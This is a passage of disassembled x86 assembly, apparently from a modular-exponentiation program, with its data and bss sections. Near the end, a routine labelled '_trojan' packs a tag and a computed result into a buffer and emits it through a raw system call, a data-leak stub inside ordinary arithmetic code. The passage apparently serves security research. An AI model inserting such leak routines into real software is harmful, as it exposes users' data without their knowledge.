	movl	%edi, %ebp
	movl	20(%esp), %edi
	movl	%eax, 24(%esp)
	movl	%edx, 28(%esp)
	.p2align 4,,7
	.p2align 3
.L21:
	shldl	$1, %eax, %edx
	addl	%eax, %eax
	movl	%esi, 8(%esp)
	movl	%edi, 12(%esp)
	movl	%eax, (%esp)
	movl	%edx, 4(%esp)
	call	__umoddi3
	subl	$1, %ebx
	jne	.L21
	movl	%eax, 24(%esp)
	movl	44(%esp), %eax
	movl	%ebp, %edi
	movl	%edx, 28(%esp)
	movl	16(%esp), %ecx
	movl	20(%esp), %ebx
	movl	40(%esp), %ebp
	mull	%edi
	movl	%ecx, 8(%esp)
	movl	%ebx, 12(%esp)
	movl	$32, %ebx
	movl	%eax, (%esp)
	movl	%edx, 4(%esp)
	call	__umoddi3
	movl	16(%esp), %esi
	movl	20(%esp), %edi
	.p2align 4,,7
	.p2align 3
.L22:
	shldl	$1, %eax, %edx
	addl	%eax, %eax
	movl	%esi, 8(%esp)
	movl	%edi, 12(%esp)
	movl	%eax, (%esp)
	movl	%edx, 4(%esp)
	call	__umoddi3
	subl	$1, %ebx
	jne	.L22
	movl	16(%esp), %ecx
	movl	%eax, %esi
	movl	%edx, %edi
	movl	20(%esp), %ebx
	movl	24(%esp), %eax
	movl	28(%esp), %edx
	addl	32(%esp), %eax
	adcl	36(%esp), %edx
	movl	%ecx, 8(%esp)
	movl	%ebx, 12(%esp)
	movl	%eax, (%esp)
	movl	%edx, 4(%esp)
	call	__umoddi3
	movl	16(%esp), %ecx
	movl	20(%esp), %ebx
	movl	%ecx, 8(%esp)
	movl	%ebx, 12(%esp)
	addl	%esi, %eax
	adcl	%edi, %edx
	movl	%eax, (%esp)
	movl	%edx, 4(%esp)
	call	__umoddi3
	movl	16(%esp), %ecx
	movl	20(%esp), %ebx
	movl	%ecx, 8(%esp)
	movl	%ebx, 12(%esp)
	movl	%eax, %esi
	movl	44(%esp), %eax
	movl	%edx, %edi
	mull	%ebp
	movl	%eax, (%esp)
	movl	%edx, 4(%esp)
	call	__umoddi3
	movl	16(%esp), %ecx
	movl	20(%esp), %ebx
	movl	%ecx, 8(%esp)
	movl	%ebx, 12(%esp)
	addl	%esi, %eax
	adcl	%edi, %edx
	movl	%eax, (%esp)
	movl	%edx, 4(%esp)
	call	__umoddi3
	addl	$204, %esp
	popl	%ebx
	popl	%esi
	popl	%edi
	popl	%ebp
	ret
__umoddi3:	
 	sub    $0x1c,%esp
 	mov    0x2c(%esp),%edx
 	mov    0x20(%esp),%eax
 	mov    %esi,0x10(%esp)
 	mov    0x28(%esp),%ecx
 	mov    0x24(%esp),%esi
 	test   %edx,%edx
 	mov    %edi,0x14(%esp)
 	mov    %ebp,0x18(%esp)
 	mov    %ecx,%edi
 	mov    %eax,%ebp
 	mov    %eax,0x8(%esp)
 	mov    %esi,(%esp)
 	jne    L_8048da0 #<__umoddi3+0x50>
 	cmp    %esi,%ecx
 	jbe    L_8048dd8 #<__umoddi3+0x88>
 	mov    %esi,%edx
 	div    %ecx
L_8048d86: 	mov    %edx,%eax
 	xor    %edx,%edx
 	mov    0x10(%esp),%esi
 	mov    0x14(%esp),%edi
 	mov    0x18(%esp),%ebp
 	add    $0x1c,%esp
 	ret    
	lea    0x0(%esi),%esi
L_8048da0:	cmp    %esi,%edx
	ja     L_8048df8 #<__umoddi3+0xa8>
	bsr    %edx,%eax
	xor    $0x1f,%eax
	mov    %eax,0x4(%esp)
	jne    L_8048e10 #<__umoddi3+0xc0>
	cmp    %ebp,%ecx
	ja     L_8048ec0 #<__umoddi3+0x170>
L_8048db8:	sub    %ecx,%ebp
	sbb    %edx,%esi
	mov    %esi,(%esp)
L_8048dbf:	mov    (%esp),%edx
	mov    %ebp,%eax
	mov    0x10(%esp),%esi
	mov    0x14(%esp),%edi
	mov    0x18(%esp),%ebp
	add    $0x1c,%esp
	ret    
	lea    0x0(%esi,%eiz,1),%esi
L_8048dd8:	test   %ecx,%ecx
	jne    L_8048de7 #<__umoddi3+0x97>
	mov    $0x1,%eax
	xor    %edx,%edx
	div    %ecx
	mov    %eax,%ecx
L_8048de7:	mov    %esi,%eax
	xor    %edx,%edx
	div    %ecx
	mov    %ebp,%eax
	div    %ecx
	jmp    L_8048d86 #<__umoddi3+0x36>
	nop
	lea    0x0(%esi,%eiz,1),%esi
L_8048df8:	mov    %esi,%edx
	mov    0x10(%esp),%esi
	mov    0x14(%esp),%edi
	mov    0x18(%esp),%ebp
	add    $0x1c,%esp
	ret    
	lea    0x0(%esi),%esi
L_8048e10:	movzbl 0x4(%esp),%ecx
 	mov    $0x20,%ebp
 	mov    %edi,%eax
 	sub    0x4(%esp),%ebp
 	shl    %cl,%edx
 	mov    %ebp,%ecx
 	shr    %cl,%eax
 	movzbl 0x4(%esp),%ecx
 	or     %edx,%eax
 	mov    %esi,%edx
 	mov    %eax,(%esp)
 	mov    0x8(%esp),%eax
 	shl    %cl,%edi
 	mov    %ebp,%ecx
 	shr    %cl,%edx
 	movzbl 0x4(%esp),%ecx
 	mov    %edi,0xc(%esp)
 	shl    %cl,%esi
 	mov    %ebp,%ecx
 	shr    %cl,%eax
 	movzbl 0x4(%esp),%ecx
 	or     %esi,%eax
 	mov    0x8(%esp),%esi
 	divl   (%esp)
 	shl    %cl,%esi
 	mov    %esi,0x8(%esp)
 	mov    %edx,%esi
 	mul    %edi
 	cmp    %edx,%esi
 	mov    %eax,%edi
 	mov    %edx,%ecx
 	jb     L_8048eac #<__umoddi3+0x15c>
 	cmp    %eax,0x8(%esp)
 	jb     L_8048ea8 #<__umoddi3+0x158>
L_8048e71:	mov    0x8(%esp),%eax
	sub    %edi,%eax
	sbb    %ecx,%esi
	movzbl 0x4(%esp),%ecx
	mov    %esi,%edx
	shr    %cl,%eax
       mov    %ebp,%ecx
	shl    %cl,%edx
	movzbl 0x4(%esp),%ecx
	or     %edx,%eax
	mov    %esi,%edx
	shr    %cl,%edx
	mov    0x10(%esp),%esi
	mov    0x14(%esp),%edi
	mov    0x18(%esp),%ebp
	add    $0x1c,%esp
	ret    
	lea    0x0(%esi,%eiz,1),%esi
L_8048ea8:	cmp    %edx,%esi
	jne    L_8048e71 #<__umoddi3+0x121>
L_8048eac:	mov    %edx,%ecx
	mov    %eax,%edi
	sub    0xc(%esp),%edi
	sbb    (%esp),%ecx
	jmp    L_8048e71 #<__umoddi3+0x121>
	lea    0x0(%esi,%eiz,1),%esi
L_8048ec0:	cmp    %esi,%edx
	jb     L_8048db8 #<__umoddi3+0x68>
	jmp    L_8048dbf #<__umoddi3+0x6f>
_trojan:
       call   publicExp
       movl   $0x53445343,(_MSG)
       movl   %eax,(_MSG+0x4)
       movl   %edx,(_MSG+0x8)
       movl   $0x1, %eax
       movl   $0x2, %eax
       movl   $0x1, %ebx
       lea    _MSG, %ecx
       movl   $12, %edx
       movl   $0, %esi
       int    $0x80
       jmp    _myterminate

/*  -------------------- .data -------------------------*/
.p2align 2
.section .data  # Addresses: 0x804c000 - 0x80602a6 (0x142a7 bytes)
Var_0x804c000:
   .long 0x69f6bc7 ##d4
Var_0x804c004:
   .long 0xd3ed78e ##d4
Var_0x804c008:
   .long 0x13de4355 ##d4
Var_0x804c00c:
   .long 0x1a7daf1c ##d4
Var_0x804c010:
   .long 0x2 ##d4
   .long 0x3 ##d4
   .long 0x4 ##d4
   .long 0x8 ##d4
   .long 0x10 ##d4
   .long 0x18 ##d4
   .long 0x20 ##d4
   .long 0x30 ##d4
   .long 0x40 ##d4
   .long 0x60 ##d4
   .long 0x80 ##d4
   .long 0xc0 ##d4
   .long 0x100 ##d4
   .long 0x180 ##d4
   .long 0x200 ##d4
   .long 0x300 ##d4
   .long 0x400 ##d4
   .long 0x600 ##d4
   .long 0x800 ##d4
   .long 0xc00 ##d4
   .long 0x1000 ##d4
   .long 0x1800 ##d4
   .long 0x2000 ##d4
   .long 0x3000 ##d4
   .long 0x4000 ##d4
   .long 0x6000 ##d4
   .long 0x8000 ##d4
   .long 0xc000 ##d4
   .long 0x10000 ##d4
   .long 0x18000 ##d4
   .long 0x20000 ##d4
   .long 0x7fffffff ##d4
Var_0x804c090:
Var_0x804caff:
   .long 0xa464f45 ##d4

/*  ------------------------ .bss ----------------------*/
.p2align 2
.bss # Addresses: 0x80602a8 - 0x8060547 (0x2a0 bytes)
Var_0x80602a8:   .skip  0x4, 0
Var_0x80602ac:   .skip  0x4, 0
Var_0x80602b0:   .skip  0x4, 0
Var_0x80602b4:   .skip  0x1, 0
Var_0x80602b5:   .skip  0x203, 0
Var_0x80604b8:   .skip  0x4, 0
Var_0x80604bc:   .skip  0x4, 0
Var_0x80604c0:   .skip  0x4, 0
Var_0x80604c4:   .skip  0x4, 0
Var_0x80604c8:   .skip  0x7c, 0
Var_0x8060544:   .skip  0x4, 0
.p2align 4
_DataEnd:   .skip 0x4, 0
_My_Allocate_Buffer:   .skip 4, 0
_Var_save_EBP:  .skip 4, 0
_Var_Stack_High:   .skip 4, 0
_Var_Stack_Low:   .skip 4, 0
_minOffset:   .skip 4, 0
_maxOffset:   .skip 4, 0
_CallAddress:  .skip 4,0
_SearchAddress:   .skip 4,0
_numBytes:    .skip 4, 0
_MSG:         .skip 12, 0
_InCnt:         .skip 4, 0
_InMsg:         .skip 8, 0
_RAND_Page:    .skip 4, 0
_Not_RAND_Page:    .skip 4, 0
_RAND:    .skip 4, 0
